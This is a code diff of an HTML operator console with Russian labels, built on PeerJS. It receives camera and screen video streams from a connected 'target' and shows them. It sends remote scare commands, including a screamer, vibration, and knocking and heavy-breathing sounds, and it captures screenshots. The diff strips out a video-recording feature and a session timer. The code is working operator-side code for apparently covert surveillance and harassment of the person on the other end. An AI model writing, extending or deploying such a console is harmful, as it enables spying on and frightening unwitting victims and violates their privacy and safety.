@@ -1,132 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TERMINAL v11 - LIVE</title>
+    <title>TERMINAL v12</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
-        #side { width: 300px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 20px; display: flex; flex-direction: column; }
-        #monitor { flex: 1; display: grid; grid-template-columns: 1fr; gap: 10px; padding: 10px; overflow-y: auto; background: #000; }
-        .video-container { position: relative; border: 1px solid #333; background: #111; border-radius: 8px; overflow: hidden; }
+        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
+        #side { width: 300px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 20px; }
+        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; background: #000; overflow-y: auto; }
+        .v-box { border: 1px solid #333; position: relative; background: #111; }
         video { width: 100%; height: auto; display: block; }
-        .v-label { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.7); color: #0f0; padding: 2px 8px; font-size: 10px; border-radius: 4px; }
-        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 8px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; text-align: left; }
+        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 8px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
         .btn:hover { background: #0f0; color: #000; }
-        .btn-red { border-color: #ff0050; color: #ff0050; }
-        .btn-red:hover { background: #ff0050; color: #fff; }
-        #st { font-size: 18px; margin-bottom: 10px; color: #ff0050; }
+        #st { font-size: 18px; margin-bottom: 20px; color: #ff0050; }
     </style>
 </head>
 <body>
     <div id="side">
-        <div id="st">● TERMINAL OFFLINE</div>
-        <div id="timer" style="margin-bottom: 20px;">00:00:00</div>
-
-        <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
-        <button class="btn" onclick="send('VIB')">📱 ВИБРАЦИЯ</button>
-        <button class="btn" onclick="takeSnapshot()" style="border-color: #00f2ea; color: #00f2ea;">📸 СКРИНШОТ</button>
-        <button id="recBtn" class="btn" onclick="toggleRecord()" style="border-color: #f1c40f; color: #f1c40f;">⏺ ЗАПИСЬ</button>
-        
-        <p style="margin-top:20px; color: #555;">ЗВУКИ:</p>
+        <div id="st">● OFFLINE</div>
+        <button class="btn" style="color:#ff0050; border-color:#ff0050;" onclick="send('SCR')">💀 СКРИМЕР</button>
+        <button class="btn" onclick="takePhoto()">📸 СКРИНШОТ</button>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/error_CD7797S.mp3')">⚠️ ОШИБКА XP</button>
     </div>
-
-    <div id="monitor">
-        </div>
+    <div id="monitor"></div>
 
     <script>
-        const MY_ID = 'SUPER_STABLE_99';
-        const peer = new Peer(MY_ID);
+        const peer = new Peer('SUPER_STABLE_99');
         let activeConn = null;
-        let recorder = null;
-        let chunks = [];
 
-        peer.on('open', () => {
-            document.getElementById('st').innerText = "● TERMINAL READY";
-            document.getElementById('st').style.color = "#0f0";
-        });
-
-        peer.on('connection', conn => {
-            activeConn = conn;
-            document.getElementById('st').innerText = "● TARGET CONNECTED";
-            startTimer();
-        });
+        peer.on('open', () => { document.getElementById('st').innerText = "● READY"; document.getElementById('st').style.color = "#0f0"; });
+        peer.on('connection', c => { activeConn = c; document.getElementById('st').innerText = "● CONNECTED"; });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                createVideoBox(stream);
-                window.currentStream = stream; // Для записи
+                const div = document.createElement('div');
+                div.className = 'v-box';
+                const v = document.createElement('video');
+                v.autoplay = true; v.srcObject = stream;
+                div.appendChild(v);
+                document.getElementById('monitor').appendChild(div);
             });
         });
 
-        function createVideoBox(stream) {
-            const container = document.createElement('div');
-            container.className = 'video-container';
-            
-            const label = document.createElement('div');
-            label.className = 'v-label';
-            label.innerText = stream.getVideoTracks()[0].label.includes('screen') ? 'SCREEN' : 'CAMERA';
-            
-            const video = document.createElement('video');
-            video.autoplay = true;
-            video.playsinline = true;
-            video.srcObject = stream;
-            
-            container.appendChild(label);
-            container.appendChild(video);
-            document.getElementById('monitor').appendChild(container);
-            
-            // Если появилось два видео, меняем сетку на 1x2
-            const count = document.querySelectorAll('video').length;
-            if(count > 1) document.getElementById('monitor').style.gridTemplateColumns = "1fr 1fr";
-        }
-
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
         function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
-
-        function takeSnapshot() {
+        function takePhoto() {
             const v = document.querySelector('video');
-            if(!v) return;
             const canvas = document.createElement('canvas');
             canvas.width = v.videoWidth; canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
-            const link = document.createElement('a');
-            link.download = 'capture.png';
-            link.href = canvas.toDataURL();
-            link.click();
-        }
-
-        function toggleRecord() {
-            if (!recorder || recorder.state === "inactive") {
-                chunks = [];
-                recorder = new MediaRecorder(window.currentStream);
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const a = document.createElement('a');
-                    a.href = URL.createObjectURL(blob);
-                    a.download = 'record.webm';
-                    a.click();
-                };
-                recorder.start();
-                document.getElementById('recBtn').innerText = "🛑 СТОП";
-            } else {
-                recorder.stop();
-                document.getElementById('recBtn').innerText = "⏺ ЗАПИСЬ";
-            }
-        }
-
-        function startTimer() {
-            let s = 0;
-            setInterval(() => {
-                s++;
-                let m = Math.floor(s/60).toString().padStart(2,'0');
-                let sec = (s%60).toString().padStart(2,'0');
-                document.getElementById('timer').innerText = `00:${m}:${sec}`;
-            }, 1000);
+            const a = document.createElement('a'); a.download = 'shot.png'; a.href = canvas.toDataURL(); a.click();
         }
     </script>
 </body>
